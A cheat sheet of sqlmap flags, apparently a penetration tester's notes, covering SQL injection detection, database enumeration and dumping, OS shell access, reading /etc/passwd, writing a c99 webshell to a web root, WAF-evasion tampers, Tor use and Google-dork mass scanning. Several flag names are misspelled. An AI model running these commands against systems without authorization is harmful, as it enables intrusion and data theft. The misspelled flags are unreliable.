SQLMAP


sqlmap --help
sqlmap -hh
	--verbost help message
sqlmap --update
sqlmap --version


GET
sqlmap -u http://10.11.1.1:8000/path/uri.php?param=val
sqlmap -u http://10.11.1.1:8000/path/uri.php?param1=val1&param2=val2
POST
sqlmap -u http://10.11.1.1:8000/path/uri.php --data "param=val" -p "param"
sqlmap -u http://10.11.1.1:8000/path/uri.php --data "param1=val1&param2=val2&submit=do"
Test all page forms
sqlmap -u http://10.11.1.1:8000/path/uri.php --forms
URL path parameters
sqlmap -u http://10.11.1.1:8000/param*/uri.php
	append asterix in path where path param=uri.php?id=param


Test delimiters:
--level 5
	1 default
	2 http cookie header testing
	3 user-agent referer heading
--risk 3
--os=LINUX
--dbms=POSTGRESQL
--dbms-creds="user:pass"
--ignore-proxy
--keep-alive
--threads=1
-l /path/to/log.file
-r request.burp
-c config.ini
-v 6
	--verbosity level (0-6)


Request parameter flags:
--mthod=PUT
--data="x=y&this=that"
--param-del="&"
--cookie="param=value&1=2"
--cookie-del=";"
--load-cookies=cookiejar.ext
--user-agent="Mozilla"
--random-agent
--mobile
	--set user agent to imitate mobile User Agent
-H "Content-Type: application/json"
or
--headers=""
--host=target.dom
--referer="sub.target.dom"
--auth-type=Basic,Digest,NTLM,PKI
--auth-cred="user:pass"
--auth-file=key.pem,key.pk
--csrf-token=CSRF_param
--csrf-url=http://urltograb.csrf-token.from/endpoint
-d mysql://111.11.1.111/db
-u "https://target.dom/
OR
--url "https://target.dom/"

Enumeration
-f
	--extensive DMBS version fingerpint
-b
OR
--banner
	--return dbms banner
--hostname
--schema
--dbs
	--list databases
--tables
	-D db_name - restrict to current database
--common-tables
--colums
	-T table_name - restrict to specific table
--common-columns
-D db_name
-C column_name
-T table_name
	--enumerate specific db, column or table
--comments
--current-user
--current-db	
--statements
	--return list of statements currently being run on dbms


Data extraction
--dump
	--dump a table
--dump-all
	--exclude sysdbs
--sql-query="SELECT whatever FROM whichever"
--sql-shell
--sql-file=/path/to/filecontainingstatements.sql


Exploitation (code execution)
--os-cmd=id
--os-pwn
--msf-path=/path/to/metasploit-framework
--os-shell
--os-smbrelay
--os-bof
--udf-inject
--shared-lib=../../path/to/udf/to/inject.so
--tmp-path=/remote/abs/path/var/tmp

Exploitation (file read/write)
--common-files
--file-read=/etc/passwd
--file-write=/usr/share/webshells/c99unlimited.php
--file-dest=/var/www/html/wp-includes/
--reg-read
--reg-key=/HKLM/whatever
--reg-add
--reg-value=/HKLM/whichever
--reg-data=/HKLM/valuedata
--reg-type=string
--reg-del
--webroot="/var/www/html"

Exploitation (Privesc)
	(enumeration)
--current-user
--current-db
--is-dba
--privileges
--roles
--dbs
-U dbUsername
	--enunmerate a dbms user, such as current users
-f
	--extensive DMBS version fingerpint
	(exploitation)
--priv-esc
--pivot-column=column_name
--dbms-creds="user:pass"


Evasion
-X EXCLUDE
	--DBMS database identifier(s) to not enumerate
--exclude-sysdbs
--param-exclude='R(EG|EX)'
	--regex to exclude parameters from testing
--param-filter=POST
	--select testable parameters by place
--where=DUMPWHERE
	--WHERE condition while table dumping
--start=LIMITSTART
	--first dump table entry to retrieve
--stop=LIMITSTOP
	--last dump table entry to retrieve
--cleanup
	--clean DBMS of sqlmap specific UDF and tables
--test-filter=TYPE
--test-skip=TECHNIQUE
--encoding=UTF-16
	--char encoding for data retrieva
--charset=1234567890qwertyuiopasdfghjklzxcvbnm
	--define blind sqli charset to prevent possible ids triggers
--binary-fields=digest,par,ams
--hex
	--hex convert during data retrieval
--no-cast
	--disable payload casting mechanism
--no-escape
	--disable string escaping mechanism
--safe-url="http://attacker.controlled.dom/endpoint"
--safe-post="http://attacker.controlled.dom/endpoint"
--safe-req=file.burp
--safe-freq
	--test requests between two visits to a given safe URL
--proxy="http://127.0.0.1:8080/"
--proxy-cred="user:pass"
--poxy-file="/path/to/creds.ext"
--check-internet
--check-tor
--tor
--tor-port=5900
--tor-type=SOCKS4,SOCKS5,HTTP
--force-ssl
--offline
	--only use session data
--purge
	--FUGAZI? remove all content from ~./sqlmap data directory
--flush-session
	--flush session files for current target from /tmp


Useful flags/functions
--smart
	--conduct thorough tests only where positive heuristics test confirm detection of possilbe sqli
--repair
	--Redump entries having unknown character marker(?)
--dump-format=(CSV,HTML,SQLITE)
--parse-errors
	--return DBMS error messages from responses to stdout
-s file.sqlite
	--resume saved from session from stored file
-t file.txt
	--log all http traffic to paintext file
--fresh-queries
	--ignore query results stored in session file
--eta
	--display for each output the estimated time of arrival
--preprocess /path/to/script
	--give scripts for preprocessing of response data


Mass SQLi Testing
--crawl=7
--crawl-exclude=REGEX
	--exclude regex matches from crawl, e.g. 'log(out|off)'
--scope=REGEX
	--Regex to filter targets from provided proxy log
-g "google dork:operators to -test"
--gpage=11
	--sqlmap crawl over Google dork results from specified page number
--batch
	--execute with default behavior never asking user input
--forms
	--parse and test forms on target url
-x "https://target.dom/sitemap.xml"
-m targets.list


TECHQNIUES
--technique=TECH
	--SQLI Techniques to test for
--dbms=MYSQL
	--only test techniques for given DBMS
--time-sec=6
--union-cols=12
--union-char='+'
--union-from=table_name
--prefix=STRING
	--injection payload prefix string
--suffix=STRING
	--injection payload suffix string
--chunked
	--HTTP chunked transfer encoded (POST) requests
--hpp
	--HTTP parameter pollution method
-o
	--enable all optimization methods
--predict-output
	--redict common queries output
--skip-waf
-z flu,bat,ban,tec=EU
	--use short mnemonics

TECHNIQUES (out-of-band[OOB])
--dns-domain=me.us-east-2.ec2.amazonaws.com
--second-url=http://sub.target.dom/output/endpoint?k=v&usr=me
	--resulting page URL searched for second-order response
--second-req=/path/to/file.burp
	--load second-order HTTP request from file

TECHNIQUES (DETECTION)
--level=5
--risk=3
--string=STRING
	--string to match when query is evaluated to True
--not-string=STRING
	--string to match when query is evaluated to False
--regexp=REGEX
	--regex to match when query is evaluated to True
--code=301
	--HTTP code to match when query is evaluated to True
--ignore-code=401
--text-only
	--diff pages based only on the textual content
--titles
	--diff pages based only on their titles
--invalid-string
	--random strings for invalidating values 
--invalid-logical
	--logical operations for invalidating values
--invalid-bignum
	--big numbers for invalidating values
--ignore-redirects
--ignore-timeouts
--timeout=30
--retries=3
--skip-urlencode
--eval="import this; this.do(value)"
	--evaluate provided Python code before request
--null-connection
	--retrieve page length without actual HTTP response body



TAMPERS
--tamper
sqlmap --list-tampers
	General
	tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
	MSSQL
	tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
	MySQL
	
	tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor


	
SQLMAP+BURP
python sqlmap -r /file.txt -p "def" --dbs --threads 5

SQLMAP+BURP (proxy back to burp)
python sqlmap -r /file.txt -p "def" --dbs --threads 5 --random-agent --proxy=http://127.0.0.1/

Running SQLMAP against a non Non-HTTP service
sqlmap <-> proxy with http interface <-> non-http service
	https://github.com/PortSwigger/non-http-proxy
	https://github.com/summitt/Burp-Non-HTTP-Extension/releases
	https://github.com/summitt/Burp-Non-HTTP-Extension/wiki
	https://github.com/summitt/lister/
		--see "SQLMAP+BURP (proxy back to burp)" (above)
		